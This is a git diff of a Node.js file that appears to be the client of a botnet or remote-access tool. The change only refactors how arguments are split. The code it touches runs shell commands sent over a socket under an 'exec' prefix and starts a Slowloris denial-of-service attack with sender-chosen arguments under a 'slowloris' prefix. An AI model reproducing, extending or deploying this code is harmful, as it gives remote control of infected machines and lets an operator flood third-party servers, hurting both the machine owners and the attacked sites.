@@ -38,6 +38,13 @@ function clearIntervalConnect() {
 client.on("data", (data) => {
 	const dataStr = data.toString();
 
+		const commandArgs = {
+			"firstArg": dataStr.split(" ")[1],
+			"secondArg": dataStr.split(" ")[2],
+			"thirdArg": dataStr.split(" ")[3],
+			"fourthArg": dataStr.split(" ")[4]
+		}
+
 	async function execute(command) {
 		await exec(
 			command,
@@ -49,7 +56,7 @@ client.on("data", (data) => {
 	}
 
 	if (dataStr.startsWith("exec")) {
-		if (dataStr.split(" ")[1] === "cd") {
+		if (commandArgs.firstArg === "cd") {
 			path = changeDir(data, path);
 		}
 		execute(dataStr.replace("exec", ""));
@@ -57,10 +64,10 @@ client.on("data", (data) => {
 
 	if (dataStr.startsWith("slowloris")) {
 		slowLoris(
-			dataStr.split(" ")[1],
-			dataStr.split(" ")[2],
-			dataStr.split(" ")[3],
-			dataStr.split(" ")[4]
+			commandArgs.firstArg,
+			commandArgs.secondArg,
+			commandArgs.thirdArg,
+			commandArgs.fourthArg
 		);
 	}
 });
